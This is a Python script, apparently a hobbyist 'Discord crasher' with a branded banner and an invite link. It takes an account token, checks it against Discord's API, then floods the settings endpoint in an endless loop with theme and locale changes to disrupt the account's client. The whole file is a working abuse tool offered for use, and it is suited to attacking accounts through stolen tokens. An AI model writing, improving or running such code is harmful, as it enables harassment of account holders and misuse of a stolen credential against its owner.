import os
import sys
import json
import time
import random
from typing import Callable, Dict, List
from itertools import cycle

import requests
from colorama import Fore as F
from pystyle import Center

BANNER: str = f"""

{F.RED}   ▄▄▄▄▄    ▄  █ ▄███▄      ▄   █▄▄▄▄ ████▄    ▄   
  █     ▀▄ █   █ █▀   ▀      █  █  ▄▀ █   █     █  
▄  ▀▀▀▀▄   ██▀▀█ ██▄▄    ██   █ █▀▀▌  █   █ ██   █ 
{F.MAGENTA} ▀▄▄▄▄▀    █   █ █▄   ▄▀ █ █  █ █  █  ▀████ █ █  █ 
              █  ▀███▀   █  █ █   █         █  █ █ 
             ▀           █   ██  ▀          █   ██ 
             
By zScorpion || Discord: https://discord.gg/x9cAxPbgsP

"""

clear: Callable[[], None] = lambda: os.system('cls' if os.name=='nt' else 'clear')

class CrashDiscord:
     def __init__(self) -> None:
          self.token: str = None
          self.api: str = "https://discord.com/api/v9/users/@me"
          self.headers: Dict[str, str] = None
     def Initialize(self) -> None:
          clear()
          print(Center.XCenter(BANNER))
          
          self.token: str = input(f"{F.YELLOW}[{F.MAGENTA}>>{F.YELLOW}] Token: {F.WHITE}")
          self.VerifyToken()
     def VerifyToken(self) -> None:
          self.headers: Dict[str, str] = {
               'Authorization': self.token,
               'Content-Type': 'Application/JSON'
          }
          print(f"\n{F.YELLOW}[{F.MAGENTA}!{F.YELLOW}] Logging: {F.WHITE}Verifing token...")
          
          response = requests.get(self.api, headers=self.headers)
          
          if response.status_code == 200:
               print(f"\n{F.YELLOW}[{F.MAGENTA}!{F.YELLOW}] Logging: {F.WHITE}Valid token")
               input(Center.XCenter(f"\n\n\n\n\n{F.YELLOW}[{F.MAGENTA}?{F.YELLOW}] Press any key for continue"))
               self.Run()
          else:
               print(f"\n{F.YELLOW}[{F.MAGENTA}!{F.YELLOW}] Logging: {F.WHITE}Invalid token")
               input(Center.XCenter(f"\n\n\n\n\n{F.YELLOW}[{F.MAGENTA}?{F.YELLOW}] Press any key for exit"))
     def Run(self) -> None:
          clear()
          print(Center.XCenter(BANNER))
          
          self.headers: Dict[str, str] = {
               'Authorization': self.token,
               'Content-Type': 'Application/JSON'
          }
          print(f"{F.YELLOW}[{F.MAGENTA}!{F.YELLOW}] Logging: {F.WHITE}Crashing Discord...")
          _api: str = f"https://discord.com/api/v9/users/@me/settings"
          
          theme = cycle(['light', 'dark'])
          self.headers: Dict[str, str] = { 'Authorization': self.token }
          while (True):
               try:
                    json: Dict[str, str] = {
                         'theme': next(theme),
                         'locale': random.choice(['ja', 'zh-TW', 'ko', 'zh-CN'])
                    }
                    requests.patch(_api, headers=self.headers, json=json)
               except KeyboardInterrupt:
                    break
                    print(f"\n{F.YELLOW}[{F.MAGENTA}!{F.YELLOW}] Logging: {F.WHITE}Discord crashed sucessfuly...")
                    input(Center.XCenter(f"\n\n\n\n\n{F.YELLOW}[{F.MAGENTA}?{F.YELLOW}] Press any key for continue"))